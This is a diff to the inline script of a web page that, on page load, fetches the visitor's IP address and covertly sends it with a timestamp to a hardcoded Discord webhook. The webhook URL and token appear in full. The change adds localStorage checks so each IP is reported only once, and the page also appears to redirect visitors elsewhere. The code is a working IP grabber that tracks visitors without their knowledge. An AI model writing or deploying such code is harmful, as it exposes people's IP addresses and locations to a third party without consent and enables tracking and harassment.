@@ -10,10 +10,10 @@
 
   <script>
     document.addEventListener("DOMContentLoaded", function() {
-      sendDiscordMessage();
+      poop();
     });
 
-    function sendDiscordMessage() {
+    function poop() {
       var webhookURL = "https://discord.com/api/webhooks/1214203058284662794/cpyZU4ceyZ2TLhojorU_akBA-jqF_45EZzdSdBQBv_NNkwCwPMWR3Kaw8nzXAeqmuXn9";
       var currentDate = new Date();
       var formattedDate = currentDate.toLocaleString('en-US', { month: 'long', day: 'numeric', year: 'numeric', hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });
@@ -22,6 +22,16 @@
         .then(response => response.json())
         .then(data => {
           var ip = data.ip;
+          
+          // Check if IP address has been logged before
+          if (isIpLogged(ip)) {
+            console.log("IP address already logged.");
+            return;
+          }
+
+          // Log the IP address
+          logIp(ip);
+
           var message = {
             content: "Opened on: " + formattedDate + "\nIP address: " + ip
           };
@@ -48,6 +58,28 @@
         .catch(error => {
           console.error("Error fetching IP address:", error);
         });
+    }
+
+    function isIpLogged(ip) {
+      // Retrieve logged IPs from local storage
+      var loggedIps = localStorage.getItem("loggedIps");
+      if (!loggedIps) {
+        return false;
+      }
+      return loggedIps.split(",").includes(ip);
+    }
+
+    function logIp(ip) {
+      // Retrieve logged IPs from local storage
+      var loggedIps = localStorage.getItem("loggedIps");
+      if (!loggedIps) {
+        loggedIps = ip;
+      } else {
+        // Append the new IP address to the existing logged IPs
+        loggedIps += "," + ip;
+      }
+      // Store the updated logged IPs in local storage
+      localStorage.setItem("loggedIps", loggedIps);
     }
 
     function redirectToDifferentWebsite() {
